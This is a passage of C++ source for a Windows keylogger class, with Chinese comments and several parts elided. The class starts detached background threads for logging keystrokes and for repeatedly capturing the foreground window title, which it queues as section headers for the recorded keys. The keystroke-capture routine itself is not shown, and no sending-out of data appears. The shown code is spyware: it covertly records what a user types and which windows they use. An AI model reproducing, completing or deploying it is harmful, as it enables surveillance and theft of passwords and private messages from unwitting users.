...
#include "tool.cpp"
//#include "myGlobal.cpp"
using namespace std;

class keyboardManager {

private:
	const int KeyBoardValue = 0x80000000; //键盘记录
	static int logFlag;

public:
	static ThreadSafeQueue<string> keyQueue;
	...
	void start() {
		...
		thread t1(std::bind(&keyboardManager::logKeyboard, this));
		thread t2(std::bind(&keyboardManager::getWindowsTitle, this));
		t1.detach();
		t2.detach();
...
private:
	...
	void getWindowsTitle() {
		char szWindowTitle[500];
		string lastTitle, tmpTitle;
		HWND hwndWindows = 0;
		while (logFlag > 0)
		{
			hwndWindows = GetForegroundWindow();
			if (hwndWindows)
			{
				::GetWindowTextA(hwndWindows, szWindowTitle, sizeof(szWindowTitle)); // 获取窗口标题
				//if (tool::is_str_utf8(szWindowTitle)) {
				//	tmpTitle = szWindowTitle;
				//}
				//else {
				tmpTitle = tool::GBKToUTF8(szWindowTitle);
				//}

				if (lastTitle.compare(tmpTitle) == 0)continue;
				lastTitle = tmpTitle;	//记录窗口的标题
				tmpTitle = "\n------- " + tmpTitle + " -------\n";
				keyQueue.push(tmpTitle);
